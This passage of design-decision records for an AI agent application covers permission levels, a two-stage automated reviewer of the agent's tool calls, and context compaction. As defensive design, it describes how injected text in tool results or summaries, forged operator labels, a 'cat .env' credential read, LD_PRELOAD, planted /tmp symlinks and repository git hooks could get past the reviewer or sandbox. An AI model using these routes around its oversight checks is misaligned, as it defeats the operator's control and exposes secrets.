  - **`screenshot` is withheld from a model that cannot see.** It answers with `BinaryContent`, which a text-only provider rejects or drops — a call spent to learn nothing. That is a fourth reason to withhold a tool alongside the operator's own set, offline mode, and run mode, so it joins them in `effective_disabled_tools` rather than becoming a new mechanism; a parked turn carries the fact on its payload, since only the parked agent knows which model it still holds.

- **D59 — Two axes: the mode, and the permission level 🟢 DECIDED: a level is a preset over (write scope, approval policy), never a name a switch branches on.** A thread already had one axis — the mode (D41) — saying *what kind of work this is*: where its files live, which tool categories it admits. What nothing could say is *how far the model may go before it stops to ask*, which is genuinely independent: the same `code` thread is sometimes "show me the plan first" and sometimes "just do it". Approval was a property of the *tool* alone (D20/D23/D25), so the operator's only dials were per-call consent and a standing grant on top of it.
  - **Four opaque level strings and a function switching on the name is the obvious build, and is the one rejected.** It works until a fifth combination is wanted: every switch grows a case, the ones that are missed fail silently, and nothing in the code says what the names *mean* — the meaning lives distributed across the branches. So a level is stored and shown as a name and **resolved to a pair**: a **ceiling** on `services/tool_sensitivity.Sensitivity` (how far the model reaches with no permission at all) and an **approval policy** for an act reaching past it (withhold the tool, park for the operator, send it to review). Plan is `read`+withhold, Manual `read`+ask, Edit `workspace_write`+ask, Auto `workspace_write`+review. A fifth preset — one that may touch the host — is a row in `PERMISSIONS` and nothing else moves; even the ordering the spawn rule needs is derived from the pair rather than hand-listed.
  - **The ceiling is a sensitivity class rather than a name of its own**, which is what makes the pair decidable. `services/tool_sensitivity.py` classifies every tool by what it *does* if it runs — `read`, `workspace_write`, `host_exec`, `external_effect`, `secret` — five kinds of reach, deliberately not five degrees of danger. "May this run unasked?" is then a comparison, not a list of tool names two files have to keep in step. The three markings that existed before (`requires_approval`, a raised `ApprovalRequired`, and nothing at all) all answer *when to ask the operator*; none of them describes the act, and a level has to know the act before the model is offered the tool at all.
  - **Plan is enforced by absence, not by asking.** At the read ceiling the mutating tools are dropped from the catalog before the model sees them, so a Plan turn ends the only way it can — in a plan the operator reads. The alternative was on the table: the soft plan-mode toggle `dsh` ships, where the tools stay in the catalog and the model is *told* not to use them. Rejected, because a read-only promise that depends on the model agreeing to it stops holding at exactly the moment it matters; withholding is the only form of read-only that survives a model deciding otherwise. One exemption, and it is at the mechanism rather than a call site: the model's own task list is writable at every level, since a turn whose only possible ending is a written plan cannot be made to ask permission to write one.
  - **Levels widen; they never narrow.** A tool that gates *itself* — the global-recall pause (D28), a skill edit, an untrusted external tool (D25) — is still answered at every level, because the reason it gates is not the one this axis reasons about. What clears such a gate is the operator: at the prompt, through a conversation grant, or — at the one level whose entire meaning is that their answers are given for them — through the review. That asymmetry is what keeps adding a level from quietly deleting a protection nobody re-examined.
    - **At Auto, "through the review" includes the review's *deterministic* answer, and for a self-gated read that costs no model call at all.** `judge.py` clears a tool the shipped catalog classifies as observing on the strength of that class — `ActionKind.READ`, recorded as the review's `read` tier — so a global recall (`corpus_retrieve`, `conversations_search`) is settled with nothing weighing its arguments, because for that class of tool there is nothing in them to weigh. It reads at first glance like the asymmetry being broken, and it is not: the gate is still *answered*, by the stage the operator's chosen level delegates to. What it does mean is that at Auto a self-gated read is not reviewed in the sense the word implies elsewhere in this entry, so the work-log row says "classified read, cleared at Auto with no review" rather than reporting it as a review that passed. Before the shortcut, every recall at Auto cost a utility-model round trip and **parked the run outright on an installation with no utility model bound** — a park nobody chose, on the act that changes the least.
    - **A command is only cleared against the directory it actually runs in, and a host command runs in none of them.** The deterministic stage's whole claim is "this reads the workspace and changes nothing", which is unsayable when the working directory is unknown — a bare `cat .env` names no directory, escapes nothing and writes nothing, so a stage reading only those fields cleared it. It is now recorded as *unplaced* (an `unbounded` entry) and escalates like any construct that was not read. `code_run_host_command` is unplaced by construction, whatever root the run resolved: it runs on the operator's machine while the workspace of the modes that offer it is a container the host cannot see, whose host-side directory the OS fence denies with the rest of `data_dir`. It therefore starts in a scratch directory of its own under the OS temp root — **named per uid and claimed rather than created**, because that root is the world-writable `/tmp` on Linux and `mkdir(exist_ok=True)` adopts a planted symlink silently (`is_dir()` follows links), which would let another local account choose what a relative path in an approved command resolves to and where the fence's one writable allowance points. A symlink, a non-directory or another user's directory raises; our own directory with loose bits is tightened to `0700`. Two angles were rejected: **running it in the run's workspace** (the fence denies that path outright — the command cannot resolve its own cwd there, let alone write), and **leaving it in the server process's directory with only the stricter judge** (that directory is this application's source tree, so a *reviewed* approval of `cat .env` would still have read the backend's own keys).
    - **A repository's config is disarmed only where a value means "do not run anything".** `services/sandbox/gitenv.py` hands git `core.fsmonitor=false` and `core.pager=cat` through the environment, which wins over every config file, so a cloned repository cannot name the program a judge-cleared `git status` runs. `diff.external` and the per-driver `textconv`/`clean`/`smudge` keys are deliberately **not** there and cannot be: git reads them as command lines, so the empty string is a program named "" — pinning `diff.external=` makes *every* `git diff` on the machine fail — and a driver's name comes from the repository's own `.gitattributes`, so it cannot be named from here at all. Blanking the attributes wholesale (`GIT_ATTR_SOURCE` at the empty tree) does stop all three and was rejected: it disables git-lfs and end-of-line normalisation too, trading a repository that can run a program for one the agent silently commits raw blobs into. Those keys are the OS fence's to bound — and ~~until that fence exists, the second half of the answer is that the commands reaching them are not cleared deterministically at all: `git diff`, `log`, `show`, `blame` and `grep` came off the read-only subcommand table, so at Auto they cost a model call instead of running whatever a cloned repository chose. `git status` stays on the table with its own residual named there~~ — **superseded by D79, which built that fence and deleted the table with it**. There is no subcommand table for anything to stay on: the whole diff family is judged like every other command now — contained, declared and fenced clears it, and a host with no fence sends it to the reviewer. The reasoning the strikethrough carried is what D79 acted on rather than something it contradicted: leaving those commands cleared on the strength of the environment pins alone would have been the fail-open the pins were written to remove, one subcommand over.
  - **Both axes degrade, in the same direction, to different answers.** An unreadable stored *mode* resolves to Normal (the mode that reaches the least); an unreadable stored *level* to Plan (the level that does the least). Both values come off a database row or a parked run's payload, and both outlive a rename. A thread opened from inside another takes the **stricter** of the spawning thread's level and its own mode's default, so one approved spawn cannot buy a standing level the operator never chose.
  - **As built.** `services/permissions/levels.py` holds the presets; `decide.py` is the single point the engine reaches when Pydantic AI hands back a deferred call, and its whole job is telling the two reasons a call can be deferred apart — the level put it there, or the tool did — because the answers differ. `conversations.permission_level` is a plain string column defaulted to `edit`, which is what every existing thread was effectively running at, so nothing on disk woke up read-only or unattended. The two axes meet in exactly one place: a mode names the level a *fresh* thread in it starts at, and nothing else about a mode constrains a level.

- **D60 — Auto's review 🟢 DECIDED: a deterministic judge first, a utility-model reviewer second, three axes, and a park on every doubt.** Auto is the level whose proposition is that the operator's approvals are given for them (D59). Two stages give them, in this order, and the order is the design. **It is modelled on LM Studio's published design**, and two of its rules are copied deliberately rather than re-derived: the reviewer is told the rubric and never the passing score, and the transcript it reads excludes tool results. Both look like details and are the load-bearing parts.
  - **The deterministic stage exists because most of what an agent does is looking.** `git status`, `ls src`, `grep -rn foo .` — sending each to a model costs a round trip, a second of latency, and a chance of being wrong about something a grammar already settles. `judge.py` ~~is a strict allowlist over a capability extracted from the command's AST~~ — **superseded by D79, which deleted the program table and left the stage ruling on three structural facts instead** — and **it has exactly one power: to approve.** What it does not recognise is *escalated*, never refused, which is precisely why it can afford to be as strict as it is (narrowing it costs model calls; widening it costs the operator's trust, and only one of those is recoverable). Two of its three no-exception rules outlived the table: an AST shape we cannot read never passes, because a partial reading is not something a rule applies to, and an un-interpolatable variable never passes, because the honest reading of an argument whose value arrives at run time is that we did not read it. The third — ~~an environment assignment never passes, because `LD_PRELOAD=… ls` is not `ls`~~ — is gone with the table (D79): the claim is still true and the fence is what answers it, since whatever a variable loads is held to the same paths and the same egress as the command that loaded it. `cd` is judged like any other word now: a target inside the worktree is contained and clears, one outside it escalates, and what keeps the *session's* directory from drifting out from under the next command is the shell runner containing the directory it tracks, rather than a rule about the verb (D79).
  - **Three axes, not one score.** A single "is this ok" number collapses two independent facts — how bad the act is, and whether it was asked for — and a model asked for the collapsed answer trades one against the other silently, where nobody can read the trade. So `risk` is a property of the act alone, `authorization` a property of the conversation alone, and `correctness` is free text catching what neither number does: the right kind of act aimed at the wrong thing. **The arithmetic lives in `decide.py`**, where a reader sees the whole rule at once — `too_destructive` ~~blocks~~ **parks** (superseded by D81) whatever the operator is judged to have asked for — an unrecoverable act is not something a conversation can authorize into being recoverable, and it stays the one place authorization does not enter; what changed is who is left holding it — `low` runs unless they said no, `high` runs only on an explicit yes, everything else parks. `correctness` moves nothing: a reviewer vetoing on "this looks like the wrong path" would be second-guessing the model's work rather than ruling on its permission, and those are different jobs. The branch is a `match` on named risk words rather than a chain ending in `else`, because that `else` was `high`'s rule wearing "everything else"'s name — a fourth, middling risk word would have inherited the one branch that can allow on an authorization alone.
  - **The rubric, never the passing score.** A reviewer told what clears the bar optimises for clearing it; a reviewer told only what the words mean answers the question it was asked. Recorded because it is the rule most likely to be helpfully undone by someone adding a worked example to the prompt.
  - **Tool results are excluded from the transcript, and that is the injection boundary.** Everything the model has read from a file, a page or an MCP server is content someone else wrote — and a reviewer that saw it could be talked into an approval by text the attacker chose, of the very call that text asked for. So the reviewer sees the operator's own messages and the assistant's own prose, and nothing else. Tool *calls* go too (the one being judged is described far more precisely by its extracted capability), and so does thinking: the model's private argument for what it is about to do is exactly the material that must not weigh on whether the *operator* asked for it. **A compaction summary is dropped as well**, and it is the subtle one — `agent/summarize.py` folds the whole thread, tool returns included, and writes the result back as a *user* message, so a page the agent read once would return wearing the one label the rubric treats as authorising. It is recognised by the marker the compaction writes, not by a heuristic. The cost falls the right way: after a compaction the reviewer has less to authorize on, and less authorization parks. What *is* shown still goes inside `wrap_untrusted`, since the assistant's prose is downstream of everything it has read and can carry an injected argument forward in its own words.
  - **A window counted from the end loses the one message the review is *about*.** The transcript was the last twelve `ModelMessage`s, and a tool round trip is two of them — so after six tool calls the operator's opening request was gone, the prompt said in as many words that they had asked for nothing, and every `high` act in a long turn parked on a missing authorization the operator had actually given in their first sentence. Two changes, and the first is the load-bearing one: the turn's opening request(s) are taken out by the turn boundary (`agent/history.TurnStart`, threaded from `drive_turn` and rebuilt from `ParkedTurn.persist_from` on resume) and always kept, and the window itself is counted in **entries of prose** — the operator's and the assistant's own words, one entry per message that carries any — rather than in messages, so tool traffic can no longer crowd out the conversation. A kept opening entry is put back in *front* only when the window had already dropped it, since the prompt claims the entries are chronological and an entry that fell out of a from-the-end window is by construction older than what is left in one. **The reviewer's transcript is not the whole read**: `_prompt_text` takes the operator's prompt at position 0 and nothing the prelude appended behind it, because the tail context carries the agent's *own* task list, and joining it would hand model-written text to the reviewer under the label `operator` — a forgery with the chassis supplying the label.
  - **The prompt is split by author, not by topic, and the split is a boundary rather than a formatting choice.** What this process derived stands in the clear — the tool name, the paths the grammar walk found, the declared reach, the tier, whether anything could not be read. Everything *model-authored* — the action summary, the command (with its comments stripped, since a comment is free text the walk does not read and the reviewer would), and each tool's projected `detail` — sits inside `untrusted_fence`, and the transcript is `json.dumps`ed inside a second fence sharing one nonce and one preamble. That last part is the specific defect it closes: with the entries rendered as `Operator: …` lines, a message whose *body* contained "Operator:" was a forgeable label, and now it is a string value in a JSON object that says whose words it is. A **cap** rides beside it — twelve model reviews per turn (`Settings.review_max_per_turn`, counted only on the model stage, so structurally-cleared commands are free) — because a turn that keeps reaching past the ceiling otherwise pays a timeout-bounded round trip per hop; past the cap the calls take the same degrade every other failure takes, which is the park.
  - **Fail closed, and at the caller.** `reviewer.py` returns `None` for every failure it can have — no utility model bound, a timeout, an unparseable answer — and never a lenient verdict standing in for one; `decide.py` owns what `None` means, and it means park. The timeout is not an optimisation: a review runs inside a live turn with the operator watching, so a reviewer that hangs holds the run open on a call nobody has been asked about, which is strictly worse than the park it was avoiding.
  - **Visible, or it does not count.** A reviewed call emits `review.started` before it is ruled on and `review.completed` after, carrying which stage settled it and on what grounds, and both land in the work log beside the call they judged (`agent/gating.py`). Without them the operator sees a tool call they never approved and no account of why it ran — indistinguishable from the gate having silently failed open. One pass per deferred batch, run concurrently, with the reviewer and the transcript built once for the batch and the judgement made per call.

- **D61 — The mode vocabulary 🟢 DECIDED: rename the stored values in one migration, with no compatibility shim.** `chat` and `coding` became `normal` and `code`. The old words were a binary's words — a mode was a yes/no about the worktree — and the axis now names a *kind of work* with three members and room for a fourth, which `chat` (every mode is a chat) and `coding` (a gerund beside two nouns) both read badly against.
  - **A translation layer was the alternative, and it is the one that rots.** Accept both spellings, map on read, write the new one: nothing to migrate, nothing to coordinate with the frontend. What it actually buys is a permanent second vocabulary — the column says `coding`, the registry says `code`, the operator's screen says Code — so every future reader has to know which layer they are standing in. It also never ends, because nothing ever proves the last old row is gone.
  - **So it is a data-only migration**: same column, same type, same nullability, two `UPDATE`s, and the server default moved with the values so a row inserted by something that predates the model (a backup restore) is still a mode the registry knows. Rows carrying anything else are left alone rather than coerced — `mode_spec` already resolves an unrecognised value to the mode that reaches the least, so an unknown row degrades instead of breaking, the same rule a corrupt permission level follows (D59).
  - **The downgrade loses `research`, and says so.** It is a sandbox thread like `chat` was, so it folds back into `chat`: the honest downgrade, rather than leaving behind a value the older code has no branch for.
  - **The renamed values are load-bearing, which is why the shim would have cost more than it saved.** `ModeId` keys the mode registry, the frontend's `SessionMode` union, the theme layer's per-mode accent, and the attribute the app shell stamps on the document root. Every one of those would have had to learn both spellings.

- **D62 — When a thread folds 🟢 DECIDED: measure the turn that is *about to run*, at 80%, keeping the last three exchanges verbatim.** The trigger measured the history's own footprint — which is what the *previous* turn cost — and then compared it against 95% of the window. Both halves of that were wrong together, and each hid the other: the measurement omitted the operator's new prompt, its attachments and the tail context appended to it, and the threshold left no room for them to arrive in. A thread could sit at 94% forever, fold on nothing, and then overflow on the first long paste. So `should_compact` now takes `incoming_tokens` and compares `max(the provider's reported prompt size, estimate_footprint(history, this thread's measured brief + tool schemas)) + incoming` against `window × threshold`, and the prelude resolves attachments and prompt-context *before* it asks.
  - **The two sources are taken at their maximum, deliberately.** The provider's reported size is exact and absent on the local servers this workspace mostly talks to, and stale the moment anything is added; the estimate is coarse and always available. Taking the larger is the only combination that cannot under-read, and under-reading is the single failure this trigger has — it walks a thread into the overflow the fold exists to prevent. The estimate also stopped counting the `reasoning` class, which is never re-sent on the OpenAI-compatible wire, and started counting the brief and tool schemas, which are ~14k tokens the old number treated as zero. A thread with no measured overhead record assumes 12k rather than nothing: deliberately under the measured figure, because the fallback should nudge the trigger early without folding a thread that was never under pressure.
  - **Tying compaction to the context-alert threshold was the tempting simplification, and it is rejected.** There is already a number describing "this thread is getting full" — the gauge's alert — and one dial for two jobs reads as tidy. But an alert is a *notification* to the operator and a fold is an *irreversible-feeling act* on their thread, and the right moment for the two differs: an alert wants to be early enough to be useful, a fold wants to be late enough not to have been unnecessary. Sharing the number means every future adjustment to one silently retunes the other, and the operator has no way to say "warn me sooner, fold me later".
  - **`keep_turns` went from 0 to 3, and became an operator setting.** 0 was defensible on its own terms — the summary *is* the replay, and a retained tail restates what the summary already covers exactly when there is no room for it. What it missed is that a summary is at its most lossy about the work **in flight**, which is precisely the work the next turn continues; folding at 95% with nothing retained is how a thread loses the thread. 0 remains legal and is now a choice made in Settings beside the threshold rather than in a deploy's environment, because it is a taste about how a thread should feel, and those do not belong in config.
  - **The window has to be the one the server will accept, not the one the model supports.** A llama.cpp server started with `-c 8192` advertises its architecture's 128k maximum, and a trigger measuring against that folds nothing before the request is refused. Discovery gained a `/props` probe and now prefers a *loaded* figure over a *maximum* wherever both are found — with never-raise semantics kept intact, since no discovered window means no compaction rather than a guessed one.

- **D63 — A context overflow 🟢 DECIDED: fold once and re-send the failed request, inside the same turn.** An overflow used to be a dead end that also poisoned the future: the oversized tool-return request stayed in the history and replayed on the next attempt, the next prelude did not fold because the measurement never saw the tool result, and the notice told the operator to start a new chat. The turn now catches the provider's refusal, folds, rebuilds, and re-enters `agent.iter` without a prompt — the resume-without-prompt shape, which re-sends the trailing tool-return request the library pops.
  - **General mid-turn folding is what was rejected, and the distinction is the whole decision.** Folding *whenever* pressure rises would mean rewriting the history underneath reasoning that is in flight — a tool call already dispatched against messages that no longer exist, indices into a list that has changed length. What makes this one safe is that it happens **between two requests**, at the exact moment nothing is running: the request was refused, so there is no in-flight state to invalidate. Every other mid-turn moment lacks that property, and "compact when needed" would have quietly acquired it as an assumption.
  - **One attempt, and then it stops.** A retry that overflows again blocks, with a *different* stop marker than the first — because the client's remedy differs, and offering "compact and retry" after a fold has already failed is a button that lies. A verifier's corrective re-attempt is blocked from folding at all: its drop indices are absolute into the pre-fold history, and a fold underneath one would silently persist the wrong slice. The same measurement now also skips a corrective re-attempt with no room for it, since retrying at peak pressure is the moment most likely to turn a merely-imperfect answer into an overflow.
  - **A fold is an event, and the event is load-bearing twice over.** `compaction.started` was added because a summarizer pass runs for tens of seconds and the only frame that ever mentioned compaction announced it as *already done* — so a live turn sat silent. The second reason is the one that would not have been found by looking at the UI: every emit touches the run's activity clock, and the summarizer's own timeout equalled the 120s inactivity watchdog, so a slow fold could get the run it was saving killed. The event refreshes the clock and the timeout dropped to 100s, so the two bounds cannot tie. `Run.fold_boundary` came with it: a response taken before a fold measured a history that no longer exists, and reading the footprint off it pinned the gauge at the pre-fold figure for the rest of the turn.

- **D64 — What the summarizer is allowed to read 🟢 DECIDED: fence every tool result, and chunk the transcript instead of eliding it.** The fold discarded most of what it was folding: a 24k-token input cap, head-and-tail elision above it, tool results cut at 2000 characters, and — with `keep_turns` at 0 — nothing verbatim behind it. The output of that is a summary confidently describing a conversation it read the two ends of.
  - **Head/tail elision is the rejected angle, and it fails in the worst possible place.** `truncate_middle` is the right tool for showing a human a long string; it is the wrong one for compaction, because the middle of a fold is where the work happened — the file that was found, the error that was diagnosed, the decision that was reached. Chunking at turn boundaries and summarizing map/reduce costs extra utility-model calls and keeps all of it; elision costs nothing and keeps the greeting and the last exchange. The input cap survives as a **chunk size** rather than a cliff, which turns it from a fidelity ceiling into a throughput knob, and last-resort elision survives only inside a single oversized turn where there is nothing to split on.
  - **The summary is stored as the most authoritative message in the thread, so what goes into it has to be labelled.** The transcript now opens with one untrusted preamble and wraps every tool result and retry in a nonce-fenced block naming its source, with the per-result cap raised to 6000 characters and the truncation *inside* the fence — a cut that closed a fence would hand the model an unterminated one. The stored summary's "From tools and documents" section is fenced on the way in, and the preamble gained a second line saying the workspace wrote it. Without that, a page the agent fetched once returns wearing the operator's own voice, which is exactly the laundering the reviewer's transcript rules already refuse to accept.
  - **The sections are a parsed contract, not a style guide.** Fixed headings let `Anchors` — exact paths, ids, names, numbers — be carried across a second fold **verbatim** rather than re-summarized, which is what stops an identifier from decaying one paraphrase per compaction. It also decides where the untrusted fence closes, so the parser recognises the eight known names and nothing else: a `## Notes` line quoted out of a fetched page must not be able to end a fence by looking like a heading.
  - **Superseded in part by D112:** there is no transcript any more — the thread's own model summarizes its own replay — so the tool-result fence, the 6000-character cap and the chunked map/reduce are gone. The sections, the stored-summary fence and the anchors carry-forward stand.

- **D65 — Compacting at a branch point 🟢 DECIDED: a compacted node is transparent in version sets.** `compaction_plan` refused a leaf with children, so a regenerate or an edit could **never** fold — which is to say the feature was absent from exactly the two operations an operator reaches for when a thread is nearly full and the last answer was wrong. The refusal was not arbitrary: a checkpoint grafted onto a branch point sits between a request and its own alternatives, and every enumeration that walks the tree would read the checkpoint as the version set's only member.
  - **The alternative was to keep refusing and tell the operator why**, which is honest and useless: the thread is full, the answer was wrong, and the one action that could free room is the one the UI declines. So the checkpoint is appended under the reseated leaf and the incoming turn hangs off it, and **every** enumeration looks *through* a compacted node — a checkpoint's children count as its parent's version alternatives. That is eleven sites (siblings, leaf descent, subtree ids, delete, reseat-to-parent, version switching, rewind, the messages view, the projection, since-checkpoint, cross-chat search), and the cost of the rule is that it is only true if all of them hold it. Get one wrong and the tree stays perfectly consistent while the *versions* silently change shape, which is the failure mode that does not raise.
  - **The turn counter was checkpoint-blind, and it is the bug this uncovered rather than caused.** `_is_turn_start` recognised a user request following a *response*; after one fold, the request following the checkpoint stopped counting, so with three turns retained the planner could miscount and refuse to fold a thread with four real turns in it. Following a checkpoint now reads as a turn start, the same way following a response does.

- **D66 — A provider's standing request settings 🟢 DECIDED: at the model layer, at construction, with no wrapper.** Anthropic prompt caching needs three cache breakpoints over the instructions and the tool definitions — the two prefix segments byte-identical across every turn of a thread — and nothing was requesting them, so every turn re-paid for the whole prefix. The question was not whether to send them but *where*.
  - **The agent layer was the obvious home and is the rejected one.** `agent.iter(model_settings=…)` is where the engine already sets parallel tool calling, and adding one more key there is a two-line change. What it buys is a setting that is true only on the paths that remembered it: a `FallbackModel` that hands the request to a second endpoint, a turn parked for approval and resumed hours later from a payload written before the setting existed, and every call site that builds its own per-request settings. A lab-wide request shape is not a property of one caller, and expressing it as one means auditing every caller forever.
  - **A wrapper model was the other rejected shape**, and it fails the same test from the other side: it works until something composes it — a fallback chain, a park's stashed agent — and then the question becomes which layer is on the outside. Pydantic AI's `Model.__init__` already accepts `settings=` and merges a request's settings *over* the model's, which is exactly the precedence wanted: a standing default a deliberate caller can still override. So the provider adapter passes them when it builds the model, behind a `model_settings(descriptor)` hook defaulted to `{}` so the other families say nothing and the engine, the fallback chain and the parked-turn payload are all untouched.
  - **Later note: additive cache tiers pay here and nowhere else.** The Messages API is the only wire with more than one breakpoint, so it is the only one where ordering blocks by how often they change buys anything. llama.cpp, vLLM and the OpenAI wire each have a single monotone boundary, and a change anywhere in the head invalidates the tool array and the whole history behind it identically whichever block moved. What those wires want instead is the **head/tail seam rule** — a block byte-stable across a conversation's turns belongs in the head, one that churns within a conversation belongs in the tail — written out in `harness/manifest.py`. And even on Anthropic the tiering is weaker than it reads: the library pins its instructions breakpoint after the last *static* part, and every block this codebase registers is a function, so only the literal brief is inside it. `openai_compat` sends retention and nothing else (D95).

- **D67 — A recall at the Auto level 🟢 DECIDED: the deterministic judge clears a read, and a read is a class of tool rather than a shape of arguments.** A self-gated read — the global memory recall, a corpus retrieval — reached Auto's reviewer on every single call, because the judge understood shell commands and nothing else and everything else fell through to the opaque description. So a recall cost a model call and a second of latency each time, and on an installation with no utility model bound it did worse than that: it **parked the run**, asking the operator to approve a read of their own memory, which is not a decision anyone made.
  - **Exempting these tools from gating altogether is the rejected angle**, and it is rejected for a reason that has nothing to do with recall. The gate exists because the tool declared it, for reasons the permission axis knows nothing about; a level widens a gate and never narrows one, so "read tools are never gated" would delete a protection at every level to fix a cost at one. What is true at Auto — and only at Auto — is that the operator's answers are given for them, so the fix belongs in *who answers*, not in whether the question is asked.
  - **The claim being made is about the tool, not the call**, which is what makes it decidable without a model. For a tool the shipped catalog classifies as a read, "what would this call do" and "what can this tool do" are the same fact: it returns something and leaves nothing different behind, whatever its arguments say. So the capability extractor describes it from the class alone and the judge approves it outright — with `unbounded` still checked first, so a partially-read action is refused *as* one. Only a **classified** name reaches that branch; an unknown one still resolves to the class that reaches furthest, so nothing an operator's own MCP server names can arrive wearing a read's clothes, and Manual, Edit and Plan are unchanged.

- **D68 — Why a checkpoint folded 🟢 DECIDED: stored on the checkpoint message's own `metadata`, not in a column.** The live divider names what triggered a fold (`threshold`, `overflow`, `manual`) and a reloaded one did not, because the checkpoint row had nowhere to keep it. The fact is about one message and is read by exactly one surface, the divider.
  - **A column was the rejected angle**, and the reason is proportion rather than difficulty: it costs an Alembic migration, a row shape every persistence path has to carry, and a schema fact the vault never sees — for one string that no query will ever filter on. `ModelRequest.metadata` is a field the library serializes with the message and never sends to a provider, so the reason rides the sealed blob beside the summary it describes, and a checkpoint stored before the field existed reads back as absent rather than as a default that was never true.
  - **The cost is that the fact is invisible to SQL**, which is acceptable precisely because nothing asks the database "which threads folded on overflow" — and the moment something does, promoting it to a column is a migration that reads the existing value out of the blob, not a redesign.

- **D69 — What a fresh request is charged for 🟢 DECIDED: five expensive categories start dormant, and the model loads a whole group for itself.** The catalog was 74 tools and ~11,790 tokens of schema on **every** request of every turn, of which `browse` alone (18 tools, 3,497 tokens) outweighed the entire standing brief. A thread that never opens a page paid for the browser for its whole life. Pydantic AI's deferred loading withholds a tool's schema until a `search_tools` call reveals it; what the library cannot supply is *which* groups and *how a model learns they exist*. So `browse`, `mail`, `calendar`, `vault` and `research` are declared dormant on their own manifests — 4,259 tokens a fresh request no longer carries, against a standing one-line-per-group index that costs 206.
  - **The index is the whole reason this is safe, and its discipline is the design.** Deferred loading is invisible by construction: a model never told the browser exists says it cannot open a page rather than searching for one. The index therefore carries a name and a summary per live group and nothing else — no counts, no "not currently loaded" — because it is re-sent byte-identical on every request of the conversation, including the ones *after* a reveal, and a line asserting the browser is unavailable shipped beside eighteen browser tools gets acted on. Anything that churns from turn to turn costs the local engine's prompt-prefix cache the whole history behind it, which is a bigger bill than the one being cut.
  - **The reveal unit is the group, not the tool.** The library ranks individual tools by keyword overlap, which is the wrong unit: a turn that decides it needs the browser needs the browser, not the four `browse_*` tools whose descriptions happen to share a word with the query. A query naming a dormant category reveals all of it and keyword matching is the fallback, so "send an email" still finds its way in without the model knowing the group's name.
  - **A static default-off category was the first rejected angle.** The operator's own enable switch already exists, so shipping `browse` off is a one-line change — and it converts a per-turn cost into a capability hole. The operator now has to know that the answer to "it says it can't open the page" is a settings pane, mid-conversation, on a thread that has already gone wrong.
  - **A reduced default set fails the same way with nobody to appeal to.** Hand-picking the thirty tools a turn usually wants requires being permanently right about what a turn will need, and the tools cut are exactly the ones whose absence is invisible — the model does not report a gap it was never shown.
  - **An intent classifier over the prompt was rejected for what it costs and where it breaks.** A utility-model call or a keyword rule at the head of every turn, guessing which groups this turn gets, spends latency to predict something the model itself decides correctly one step later — and it is wrong precisely when a conversation turns, which is the case the operator notices ("now check my email", on turn nine).
  - **A bespoke reveal tool with a per-conversation column was the last, and it is rejected on truth rather than effort.** The library re-derives the revealed set from the outgoing messages on every request, so a column would be a second source for a fact that is already computed from the history — and the two disagree the first time a fold, a branch or a rewind changes the messages. The reveal lives in the messages and nowhere else.
  - **The cost is a cache break, once per group per conversation** (D66). A reveal changes the tool array mid-conversation, so the local engine's prefix cache is invalidated from that point and Anthropic's tool-array breakpoint is re-broken. That is the trade being made, and it is what makes group-at-a-time and a byte-stable index load-bearing rather than tidy: paying it once to open the browser is worth 3,497 tokens a turn, and paying it per tool would not be.
  - **The second cost is that a fold un-reveals** (D62, D63), because the revealed set is derived from the replay and compaction replaces the folded stretch with a checkpoint. Both folds therefore lead the checkpoint's parts with one `ToolAvailabilityDeltaPart` carrying what was revealed below it, sealed with the summary so a cold reload keeps the tools too. Nothing else had to act: branching drops a reveal exactly when it drops the messages carrying it, which is correct.
  - **Measured across this pass** — deferral plus the entries below — a normal/edit turn's standing overhead went from 13,243 to 6,359 tokens, and the ceiling test that guards it now measures both numbers: what a fresh request ships, and what the whole corpus would cost if every group opened.
  - **Later note: production was not performing the subtraction the ceiling test performed.** The ceiling filtered `defer_loading` itself and then measured the list it had produced, while `MeasureOverhead` measured `ModelRequestParameters.function_tools` — every definition the stack produced, dormant ones included — so the live gauge charged a fresh request for the whole corpus and handed the operator back exactly the figure this entry removed. The library's own `declared_function_tools` is not the substitute either: `tool_visibility` is resolved inside the model call, after every capability hook, and before that the fallback is each definition's own `defer_loading`, which stays set after a reveal — so both lists are byte-identical either side of the one event that matters. `agent/assembled.py` is the one place that rule lives, and two turns driven through the real agent now pin it.

- **D70 — Recalling the operator's own memory 🟢 DECIDED: `memory_recall` is not gated at any level; the context gate keeps `corpus_retrieve` and `conversations_search`.** D28 built the gate as *context hygiene* — a global, relevance-ranked read over content the operator did not write, which they should be able to keep out of the window. Memory was given the same gate for symmetry, and the symmetry was the error: long-term memory holds only what this agent was told to remember on the operator's behalf, so there is nothing in it to keep out. What the gate bought was a park on the lookup the agent needs most often.
  - **D67 fixed the cost at one level and could not fix this.** Clearing a classified read deterministically stopped a recall from costing a model call at Auto, and at Manual and Edit — the ordinary levels — it was still a pause asking the operator to approve a read of their own notes, which is not a decision anyone made. A repair on the permission axis cannot remove a gate that should never have been declared.
  - **Dropping the gate for the other two surfaces is the rejected angle**, and D28's reasoning survives intact for them: `corpus_retrieve` with no `source_ids` and `conversations_search` reach indexed folders, uploads and other threads — content that came from somewhere else and is exactly what the operator may want kept out. The explicit-id reads stay ungated for the same reason they always were.
  - **The classification is untouched.** `memory_recall` is still `Sensitivity.READ`, so D67's judge still clears it on the Auto path; a class is a claim about what a tool does, and it is unrelated to whether the tool declares a gate.

- **D71 — Who writes what the model reads about a tool 🟢 DECIDED: a pure describing stage at the namespacing seam, run last, after every policy gate.** Two of the three authors of a tool's model-facing text are outside this repository. Pydantic AI wraps any docstring carrying a `Returns:` section in `<summary>`/`<returns>` XML with no option to turn it off, and `pydantic_ai_harness`'s toolsets cross-reference each other by their own un-namespaced function names — `snapshot`, `stop_command` — which this catalog, namespacing everything `category_tool`, never offers. A model that follows one of those calls a tool that is not there. A third defect is ours by adoption: the harness's `Planning` emits its subtasks vocabulary into the schema while we run with subtasks off, so the runtime rejects every field the model is charged for. The pass took the catalog from 52,127 to 45,208 characters.
  - **Forking the harness docstrings was the obvious fix and is the rejected one.** Vendoring the text buys a correct catalog once and a maintenance obligation forever: the next release changes behavior our copy still describes the old way, and nothing fails when it drifts — the model just reads a confident, stale description.
  - **A `WrapperToolset` per category is the shape the library suggests**, and it fails on coverage. It makes the rewrite a property of each wrapper, so every contributed category has to remember to be wrapped and a manifest that forgets is silently un-rewritten. A prepare stage is one line at the seam every tool already passes through and cannot be skipped by a new feature.
  - **It runs outermost, and that ordering is a rule rather than an accident**: a description must never be able to decide whether a tool is offered, so the enabled filter and the approval gate both settle before any text is touched. And it is a pure function over a `ToolDefinition`, deep-copying and idempotent, because it runs once per model request over definitions the operator's catalog and the sensitivity classifier read independently.
